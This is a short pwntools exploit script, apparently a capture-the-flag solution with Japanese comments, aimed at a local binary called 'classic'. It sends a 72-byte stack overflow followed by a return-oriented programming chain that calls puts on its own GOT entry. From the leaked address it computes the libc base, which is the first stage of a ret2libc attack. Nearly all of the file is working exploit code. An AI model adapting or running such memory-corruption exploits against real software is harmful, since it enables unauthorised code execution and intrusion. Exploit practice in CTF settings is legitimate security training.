from pwn import *
from sys import argv

#context.log_level = "debug"

binary = "./classic"

elf = ELF("./classic")
libc = elf.libc

PUTS_OFF = 0x809c0

if len(argv) >= 2 and sys.argv[1] == "d":
    p = gdb.debug(binary, '''
        break *0x4006d6
        continue
    ''')
else:
    p = process(binary)

payload = b""
payload += b"A" * 72
payload += p64(0x400753)    # pop rdi ; ret  ;
payload += p64(0x601018)    # puts@got
payload += p64(0x400520)    # puts@plt
payload += p64(0x4006a9)    # main_addr

p.recvuntil("Local Buffer >> ")          # "Local Buffer >> "が来るまで読み込む
p.sendline(payload)                      # ペイロードを送信
p.recvuntil("Have a nice pwn!!\n")       # "Have a nice pwn!!\n"が来るまで読み込む

# puts_gotのリーク
puts_got = u64(p.recv(6)+b"\x00\x00")    # データの整形
log.info("puts_got: 0x{:08x}".format(puts_got))

# libcのベースアドレス特定
libc_base = puts_got - PUTS_OFF
log.info("libc_base: 0x{:08x}".format(libc_base))

# main関数が呼び出されたか確認
print(p.recv(1024))

